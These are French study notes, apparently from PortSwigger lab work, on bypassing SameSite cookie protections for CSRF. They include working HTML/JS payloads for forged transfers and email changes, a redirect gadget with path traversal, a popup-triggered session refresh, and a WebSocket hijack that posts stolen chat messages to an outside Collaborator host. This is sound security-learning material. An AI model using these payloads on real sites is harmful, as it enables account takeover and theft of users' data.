> Contourner les restrictions de cookies [SameSite](../SameSite)

## Bypassing SameSite Lax restrictions using GET requests

(Contournement des restrictions SameSite Lax à l'aide de requêtes GET | Contournement de SameSite Lax via la substitution de méthode)

Si un site  appliquent des restrictions `Lax` à leurs **cookies de session**, explicitement ou par défaut, vous pouvez toujours lancer une attaque CSRF en sollicitant **une `GET`requête du navigateur de la victime.**

> Tant que la requête `implique une navigation de premier niveau`, le navigateur inclura le cookie de session de la victime.

Voici l'une des approches les plus simples pour lancer une telle attaque :

```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Même si une requête ordinaire `GET` n'est pas autorisée, certains frameworks permettent de surcharger la méthode spécifiée dans la ligne de requête. 

Par exemple, Symfony prend en charge le paramètre `_method` dans les formulaires, qui prime sur la méthode normale pour le routage :

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

Exploitation par GET

```html
<script>
document.location = "https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000&_method=POST"
</script>
```


> Un site qui protège ses cookies avec `SameSite=Lax` n’empêche **pas** les requêtes issues d’une **navigation de premier niveau** (clics, redirections, `window.location`, formulaires) : dans ces cas le navigateur envoie le cookie de session. Si le serveur exécute des actions sensibles en réponse à une **requête GET** (ou accepte qu’on remplace la méthode via un paramètre comme `_method`), un attaquant peut forcer la victime à naviguer vers une URL malveillante et déclencher cette action à sa place (attaque CSRF).


## Bypassing SameSite restrictions using on-site gadgets

(Contourner les restrictions SameSite à l'aide de gadgets sur site | Contournement strict de SameSite via la redirection côté client)

Si un cookie a l’attribut `SameSite=Strict`, le navigateur ne l’enverra pas quand une page d’un autre site fait une requête.  

Mais on peut contourner ça si le **site lui‑même** contient un petit code (un « gadget ») qui crée ensuite une **nouvelle** requête vers ce même site. (url des commentaire, url de redirection etc...)

Par exemple, `le gadget peut prendre un paramètre d’URL (contrôlable par un attaquant)` et `faire une redirection côté client vers une autre page du même site`. Pour le navigateur, cette redirection est juste une nouvelle requête normale vers le **même domaine**, donc tous les cookies du site (même avec `SameSite=Strict`) sont envoyés.

Si un attaquant peut contrôler ce gadget pour forcer une telle requête interne, il peut contourner totalement la protection `SameSite`.

```html
<script>
    document.location = "https://target.com/post/comment/confirmation?postId=../../my-account/change-email?email=pwned@web-security-academy.net&submit=1";
</script>
```

## Bypassing SameSite restrictions via vulnerable sibling domains

(Contournement des restrictions SameSite via des domaines frères vulnérables | Contournement strict de SameSite via un domaine frère)

Que vous testiez le site Web de quelqu'un d'autre ou que vous essayiez de sécuriser le vôtre, il est essentiel de garder à l'esprit qu'une demande peut toujours provenir du même site même si elle est émise sur plusieurs origines.

Assurez-vous d'auditer minutieusement toute la surface d'attaque disponible, y compris les domaines frères. En particulier, les vulnérabilités permettant de déclencher une requête secondaire arbitraire, comme XSS, peuvent compromettre complètement les défenses du site, exposant ainsi tous les domaines du site à des attaques intersites.


> Même si tu appliques `SameSite` aux cookies, un site _frère_ (un sous-domaine ou domaine proche) vulnérable peut toujours servir de vecteur pour contourner ces protections. Si ce domaine frère permet par exemple une XSS ou toute requête arbitraire côté client, alors il peut déclencher des requêtes « du même site » et réussir des attaques CSRF ou des détournements de WebSocket (CSWSH).  

**Pourquoi c’est important (conceptuel)**

- `SameSite` réduit l’envoi de cookies dans des requêtes cross-site _depuis d’autres origines_.
- **Mais** si l’attaquant contrôle un _domaine frère_ (ex : `attacker.example.com`) qui partage la même racine de cookie (`.example.com`) ou a des possibilités JS pour appeler le domaine ciblé, la requête peut être considérée comme « venant du même site » ou les cookies peuvent être envoyés, rendant `SameSite` insuffisant.
- Les vulnérabilités comme **XSS** sur un domaine frère sont donc catastrophiques : elles permettent d’exécuter du JS qui effectue des requêtes authentifiées contre les autres sous-domaines.
- Les **WebSockets** : la poignée de main WS commence par une requête HTTP/HTTPS — si cette requête inclut des cookies et que l’origine est acceptée, un attaquant peut établir une socket authentifiée (CSWSH = Cross-Site WebSocket Hijacking).

**Exemple concret (rapide)**

- Domaine cible : `app.example.com`
- Cookie d’auth : `Set-Cookie: session=ABC; Domain=.example.com; SameSite=Strick`
- Domaine vulnérable : `blog.example.com` contient une XSS.  
    Si un attaquant injecte du JS dans `blog.example.com`, ce JS peut faire une requête `POST https://app.example.com/transfer` — le navigateur inclura le cookie `session=ABC` parce que le cookie est défini sur `.example.com`. Résultat : CSRF réussi malgré SameSite.

**CSRF + WebSocket**

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```



## Bypassing SameSite Lax restrictions with newly issued cookies

(Contourner les restrictions SameSite Lax avec les cookies nouvellement émis | Contournement de SameSite Lax via l'actualisation des cookies)

Par défaut, Chrome applique `SameSite=Lax` si l’attribut n’est pas défini. Normalement, ça bloque l’envoi des cookies dans les requêtes POST intersites. Mais, pour ne pas casser les mécanismes d'authentification unique SSO, Chrome fait une exception : pendant 2 minutes après la création d’un cookie, il sera quand même envoyé dans ces requêtes. Résultat : **l’utilisateur reste vulnérable au CSRF pendant cette courte fenêtre.**

> La règle des **2 minutes** ne concerne **que les cookies sans attribut `SameSite`** (donc ceux pour lesquels Chrome applique automatiquement `Lax` par défaut).
> 
> Si le développeur définit **explicitement** `SameSite=Lax`, alors **la fenêtre d’exception de 2 minutes n’existe pas**.


Programmer l’attaque pendant la fenêtre de 2 minutes est courte et difficile à exploiter directement. Une stratégie plus réaliste consiste à provoquer **préalablement** le renouvellement du cookie de session de la victime (par exemple via un flux de connexion SSO/OAuth qui renouvelle la session). 

Pour que ce renouvellement se produise sans que la victime ait à se reconnecter manuellement, il faut déclencher une **navigation de niveau supérieur** (top-level) vers la page qui effectue la régénération du cookie: le navigateur inclura alors les cookies existants OAuth pendant cette navigation et la session sera mise à jour automatiquement. 

Une fois le cookie « frais » en place, l’attaquant peut tenter l’action ciblée.

On peut aussi ouvrir la page de renouvellement dans un **nouvel onglet**, ce qui laisse la victime sur la page d’origine pendant que la session est actualisée — mais les navigateurs bloquent généralement les pop-ups/onglets ouverts automatiquement à moins que l’ouverture ne soit liée à une **action utilisateur** (clic). 

C’est pourquoi les techniques qui ouvrent un nouvel onglet sont souvent liées à un événement déclenché par l’utilisateur (clic, touche, etc.), afin d’éviter le blocage automatique.

```js
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```

De cette façon, la méthode `window.open()` n'est invoquée que lorsque l'utilisateur clique quelque part sur la page

**Contourner le bloqueur de popups**

```html
<form method="POST" action="https://0a7e00c804b1c02e80ccc2c70083003a.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<script>
    window.onclick = () => {
        window.open('https://0a7e00c804b1c02e80ccc2c70083003a.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```


**Étapes de l’attaque (résumé technique)**

1. Repérer une page/endpoint sur le domaine cible qui force la création/renouvellement d’une session (ex : flow OAuth, endpoint “reconnect”).
2. Forcer une **navigation top-level** de la victime vers cette page (pour que les cookies d’authentification soient inclus).
3. Une fois la session mise à jour, rediriger la victime vers une page sous ton contrôle.
4. Depuis ta page, lancer la requête malveillante (POST, etc.) qui profitera du cookie tout juste émis.
